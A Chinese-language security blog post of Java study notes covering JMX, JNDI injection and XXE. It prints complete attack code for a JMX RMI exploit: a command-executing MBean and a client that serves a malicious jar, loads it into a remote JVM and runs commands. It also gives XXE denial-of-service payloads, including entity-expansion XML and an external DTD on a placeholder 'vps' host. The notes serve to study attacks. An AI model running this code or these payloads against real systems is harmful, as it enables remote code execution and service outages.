

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/92be8204c485c8f6383d7346a7c613f8.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Zer0peach">
  <meta name="keywords" content="">
  
    <meta name="description" content="（持续跟新）Y4tacker&#x2F;JavaSec: a rep for documenting my study, may be from 0 to 0.1 (github.com) 基础知识JMXjava管理扩展，用来管理和检测java程序，最常用到的就是对于JVM的监测和管理，比如JVM内存、CPU使用率、线程数、垃圾收集情况等等，最主要还是被用来做各种监控工具  MBeanServer">
<meta property="og:type" content="article">
<meta property="og:title" content="跟着Y4tacker学java">
<meta property="og:url" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/index.html">
<meta property="og:site_name" content="Zer0peach can&#39;t think">
<meta property="og:description" content="（持续跟新）Y4tacker&#x2F;JavaSec: a rep for documenting my study, may be from 0 to 0.1 (github.com) 基础知识JMXjava管理扩展，用来管理和检测java程序，最常用到的就是对于JVM的监测和管理，比如JVM内存、CPU使用率、线程数、垃圾收集情况等等，最主要还是被用来做各种监控工具  MBeanServer">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918105421592.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124151214.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124447218.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124638694.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124744831.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124755156.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918141720888.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918171447416.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161328311.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161506267.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161445816.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161726647.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161839000.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924164904743.png">
<meta property="article:published_time" content="2023-09-18T02:36:36.000Z">
<meta property="article:modified_time" content="2024-03-02T12:50:54.645Z">
<meta property="article:author" content="Zer0peach">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://zer0peach.github.io/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918105421592.png">
  
  
  
  <title>跟着Y4tacker学java - Zer0peach can&#39;t think</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Zer0peach&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="跟着Y4tacker学java"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-09-18 10:36" pubdate>
          2023年9月18日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          27k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          224 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">跟着Y4tacker学java</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="（持续跟新）"><a href="#（持续跟新）" class="headerlink" title="（持续跟新）"></a>（持续跟新）</h1><p><a target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/tree/main">Y4tacker&#x2F;JavaSec: a rep for documenting my study, may be from 0 to 0.1 (github.com)</a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="JMX"><a href="#JMX" class="headerlink" title="JMX"></a>JMX</h2><p>java管理扩展，用来管理和检测java程序，最常用到的就是对于JVM的监测和管理，比如JVM内存、CPU使用率、线程数、垃圾收集情况等等，最主要还是被用来做各种监控工具</p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918105421592.png" srcset="/img/loading.gif" lazyload alt="image-20230918105421592"></p>
<p>MBeanServer负责管理MBean，所有的MBean都要注册到MBeanServer上</p>
<p>通过<code>ManagementFactory.getPlatformMBeanServer()</code>获取当前<code>JVM</code>内的<code>MBeanServer</code></p>
<h3 id="JMX-RMI攻击"><a href="#JMX-RMI攻击" class="headerlink" title="JMX RMI攻击"></a>JMX RMI攻击</h3><p>攻击者可以远程注入一个恶意的MBean，再去调用里面的用于执行命令的方法</p>
<p>前提条件:</p>
<ul>
<li>允许远程访问，没有开启认证 (com.sun.management.jmxremote.authenticate&#x3D;false)</li>
<li>能够远程注册 MBean (javax.management.loading.MLet)</li>
</ul>
<p>EvilMBean.java:</p>
<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 定义MBean接口和用来执行命令的方法</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">EvilMBean</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd);
&#125;</code></pre></div>

<p>Evil.java:      (接口类名去掉MBean后缀)</p>
<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> java.io.BufferedReader;
<span class="hljs-keyword">import</span> java.io.InputStreamReader;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 类名要与实现的接口的前缀一样</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> <span class="hljs-keyword"><span class="hljs-keyword">implements</span> <span class="hljs-type">EvilMBean</span></span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd) &#123;
        <span class="hljs-keyword">try</span> &#123;
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(cmd);
            BufferedReader stdInput = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getInputStream()));
            BufferedReader stdError = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getErrorStream()));
            <span class="hljs-keyword">String</span> stdout_err_data = <span class="hljs-string">&quot;&quot;</span>;
            <span class="hljs-keyword">String</span> s;
            <span class="hljs-keyword">while</span> ((s = stdInput.readLine()) != <span class="hljs-literal">null</span>) &#123;
                stdout_err_data += s + <span class="hljs-string">&quot;\n&quot;</span>;
            &#125;
            <span class="hljs-keyword">while</span> ((s = stdError.readLine()) != <span class="hljs-literal">null</span>) &#123;
                stdout_err_data += s + <span class="hljs-string">&quot;\n&quot;</span>;
            &#125;

            proc.waitFor();
            <span class="hljs-keyword">return</span> stdout_err_data;
        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
            <span class="hljs-keyword">return</span> e.toString();
        &#125;
    &#125;
&#125;</code></pre></div>

<p>将上述两个java文件编译后打包成jar包:</p>
<div class="code-wrapper"><pre><code class="hljs reasonml">jar -cvf compromise.jar <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilMBean</span>.</span></span><span class="hljs-keyword">class</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Evil</span>.</span></span><span class="hljs-keyword">class</span></code></pre></div>

<p>注意打包的java版本，这会有版本问题，1.8.131 打包的在 1.7.80 用不了。</p>
<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpExchange;
<span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpHandler;
<span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpServer;

<span class="hljs-keyword">import</span> javax.management.MBeanServerConnection;
<span class="hljs-keyword">import</span> javax.management.ObjectInstance;
<span class="hljs-keyword">import</span> javax.management.ObjectName;
<span class="hljs-keyword">import</span> javax.management.remote.JMXConnector;
<span class="hljs-keyword">import</span> javax.management.remote.JMXConnectorFactory;
<span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;
<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.net.InetAddress;
<span class="hljs-keyword">import</span> java.net.InetSocketAddress;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Iterator;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * Created by k1n9 on 2017/8/23.</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteMbean</span> &#123;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">JARNAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;compromise.jar&quot;</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">OBJECTNAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;MLetCompromise:name=evil,id=1&quot;</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">EVILCLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Evil&quot;</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
        <span class="hljs-keyword">try</span> &#123;
        	<span class="hljs-comment">//开启Http服务，提供带mlet标签的html和恶意MBean的jar包</span>
            <span class="hljs-type">HttpServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> HttpServer.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(<span class="hljs-number">4141</span>), <span class="hljs-number">0</span>);
            server.createContext(<span class="hljs-string">&quot;/mlet&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MLetHandler</span>());
            server.createContext(<span class="hljs-string">&quot;/&quot;</span> + JARNAME, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JarHandler</span>());
            server.setExecutor(<span class="hljs-literal">null</span>);
            server.start();
			<span class="hljs-comment">//这里可以改成args的参数就可以在命令行下使用了，JMX的ip，端口，要执行的命令</span>
            connectAndOwn(<span class="hljs-string">&quot;10.18.224.59&quot;</span>, <span class="hljs-string">&quot;2333&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>);

            server.stop(<span class="hljs-number">0</span>);
        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;

    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connectAndOwn</span><span class="hljs-params">(String serverName, String port, String command)</span> &#123;
        <span class="hljs-keyword">try</span> &#123;
        	<span class="hljs-comment">//建立连接</span>
            <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span> + serverName + <span class="hljs-string">&quot;:&quot;</span> + port + <span class="hljs-string">&quot;/jmxrmi&quot;</span>);
            System.out.println(<span class="hljs-string">&quot;URL: &quot;</span> + u + <span class="hljs-string">&quot;, connecting&quot;</span>);

            <span class="hljs-type">JMXConnector</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> JMXConnectorFactory.connect(u, <span class="hljs-literal">null</span>);
            System.out.println(<span class="hljs-string">&quot;Connected: &quot;</span> + c.getConnectionId());

            <span class="hljs-type">MBeanServerConnection</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getMBeanServerConnection();

            <span class="hljs-type">ObjectInstance</span> <span class="hljs-variable">evil_bean</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
            <span class="hljs-keyword">try</span> &#123;
                evil_bean = m.getObjectInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectName</span>(OBJECTNAME));
            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
                evil_bean = <span class="hljs-literal">null</span>;
            &#125;

            <span class="hljs-keyword">if</span> (evil_bean == <span class="hljs-literal">null</span>) &#123;
                System.out.println(<span class="hljs-string">&quot;Trying to create bean...&quot;</span>);
                <span class="hljs-type">ObjectInstance</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
                <span class="hljs-keyword">try</span> &#123;
                    evil = m.createMBean(<span class="hljs-string">&quot;javax.management.loading.MLet&quot;</span>, <span class="hljs-literal">null</span>);
                &#125; <span class="hljs-keyword">catch</span> (javax.management.InstanceAlreadyExistsException e) &#123;
                    evil = m.getObjectInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectName</span>(<span class="hljs-string">&quot;DefaultDomain:type=MLet&quot;</span>));
                &#125;

                System.out.println(<span class="hljs-string">&quot;Loaded &quot;</span> + evil.getClassName());
				<span class="hljs-comment">//调用 getMBeansFromURL 从远程服务器获取 MBean</span>
                <span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> m.invoke(evil.getObjectName(), <span class="hljs-string">&quot;getMBeansFromURL&quot;</span>,
                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;String.format(<span class="hljs-string">&quot;http://%s:4141/mlet&quot;</span>, InetAddress.getLocalHost().getHostAddress())&#125;,
                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;String.class.getName()&#125;
                        );
                <span class="hljs-type">HashSet</span> <span class="hljs-variable">res_set</span> <span class="hljs-operator">=</span> (HashSet)res;
                <span class="hljs-type">Iterator</span> <span class="hljs-variable">itr</span> <span class="hljs-operator">=</span> res_set.iterator();
                <span class="hljs-type">Object</span> <span class="hljs-variable">nextObject</span> <span class="hljs-operator">=</span> itr.next();
                <span class="hljs-keyword">if</span> (nextObject <span class="hljs-keyword">instanceof</span> Exception) &#123;
                    <span class="hljs-keyword">throw</span> ((Exception)nextObject);
                &#125;
                evil_bean = ((ObjectInstance)nextObject);
            &#125;
				<span class="hljs-comment">//调用恶意 MBean 中用于执行命令的函数</span>
            System.out.println(<span class="hljs-string">&quot;Loaded class: &quot;</span> + evil_bean.getClassName() + <span class="hljs-string">&quot; object &quot;</span> + evil_bean.getObjectName());
            System.out.println(<span class="hljs-string">&quot;Calling runCommand with: &quot;</span> + command);
            <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> m.invoke(evil_bean.getObjectName(), <span class="hljs-string">&quot;runCommand&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;command&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;String.class.getName()&#125;);
            System.out.println(<span class="hljs-string">&quot;Result: &quot;</span> + result);
        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;

    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MLetHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> &#123;
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange t)</span> <span class="hljs-keyword">throws</span> IOException &#123;
        	<span class="hljs-comment">/**</span>
<span class="hljs-comment">             * mlet 标签</span>
<span class="hljs-comment">             * &lt;MLET</span>
<span class="hljs-comment">			 * CODE = class | OBJECT = serfile</span>
<span class="hljs-comment">			 * ARCHIVE = &quot;archiveList&quot;</span>
<span class="hljs-comment">			 * [CODEBASE = codebaseURL]</span>
<span class="hljs-comment">			 * [NAME = mbeanname]</span>
<span class="hljs-comment">			 * [VERSION = version]</span>
<span class="hljs-comment">			 * &gt;</span>
<span class="hljs-comment">			 * [arglist]</span>
<span class="hljs-comment">			 * &lt;/MLET&gt;</span>
<span class="hljs-comment">             */</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">respone</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;&lt;HTML&gt;&lt;mlet code=%s archive=%s name=%s&gt;&lt;/mlet&gt;&lt;/HTML&gt;&quot;</span>, EVILCLASS, JARNAME, OBJECTNAME);
            System.out.println(<span class="hljs-string">&quot;Sending mlet: &quot;</span> + respone + <span class="hljs-string">&quot;\n&quot;</span>);
            t.sendResponseHeaders(<span class="hljs-number">200</span>, respone.length());
            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> t.getResponseBody();
            os.write(respone.getBytes());
            os.close();
        &#125;
    &#125;

    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JarHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> &#123;
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange t)</span> <span class="hljs-keyword">throws</span> IOException &#123;
            System.out.println(<span class="hljs-string">&quot;Request made for JAR...&quot;</span>);
            <span class="hljs-comment">//这里的 compromise.jar 可以根据实际的路径来修改</span>
            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/k1n9/Workspace/Java/compromise.jar&quot;</span>);
            <span class="hljs-type">byte</span>[] bytearray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>)file.length()];
            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);
            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis);
            bis.read(bytearray, <span class="hljs-number">0</span> , bytearray.length);
            t.sendResponseHeaders(<span class="hljs-number">200</span>, file.length());
            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> t.getResponseBody();
            os.write(bytearray, <span class="hljs-number">0</span>, bytearray.length);
            os.close();
        &#125;
    &#125;
&#125;</code></pre></div>

<p>就带过吧，不知道有什么用</p>
<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。</p>
<p>JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。</p>
<p>java Naming</p>
<p>java Directory</p>
<p>ObjectFactory</p>
<p>JNDI注入的问题就是出在可远程下载自定义的ObjectFactory类</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p>
<p>几个比较关键的属性：</p>
<ul>
<li>className：远程加载时所使用的类名；</li>
<li>classFactory：加载的class中需要实例化类的名称；</li>
<li>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file&#x2F;ftp&#x2F;http等协议；</li>
</ul>
<h2 id="类字节码"><a href="#类字节码" class="headerlink" title="类字节码"></a>类字节码</h2><p>利用javassist生成字节码 （都是代码，就不放上来了）</p>
<h2 id="java中的XXE"><a href="#java中的XXE" class="headerlink" title="java中的XXE"></a>java中的XXE</h2><p>内部实体与外部实体</p>
<p>这个概念还算比较重要故此特地记录一下</p>
<p>内部实体：如果一个实体是在DTD中声明的，它就被称为内部实体。 例如：<code>&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</code></p>
<p>外部实体：如果一个实体在DTD之外被声明，那么它就被称为外部实体，由<strong>SYSTEM标识</strong>。 例如：<code>&lt;!ENTITY entity_name SYSTEM &quot;entity_value&quot;&gt;</code></p>
<h3 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h3><p>构造恶意XML文件耗尽可用内存</p>
<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/dos.dtd&quot;</span> [</span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">data</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;tea;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span></code></pre></div>

<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % a0 <span class="hljs-string">&quot;dos&quot;</span> &gt;</span>
<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">a1</span> <span class="hljs-string">&quot;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;&quot;</span>&gt;</span>
<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">a2</span> <span class="hljs-string">&quot;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;&quot;</span>&gt;</span>
<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">a3</span> <span class="hljs-string">&quot;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;&quot;</span>&gt;</span>
<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">a4</span> <span class="hljs-string">&quot;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;&quot;</span>&gt;</span>
<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">tea</span> <span class="hljs-string">&quot;%a4;&quot;</span> &gt;</span></code></pre></div>

<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY a <span class="hljs-string">&quot;a&amp;b;&quot;</span> &gt;</span></span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-string">&quot;&amp;a;&quot;</span> &gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;a;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span></code></pre></div>

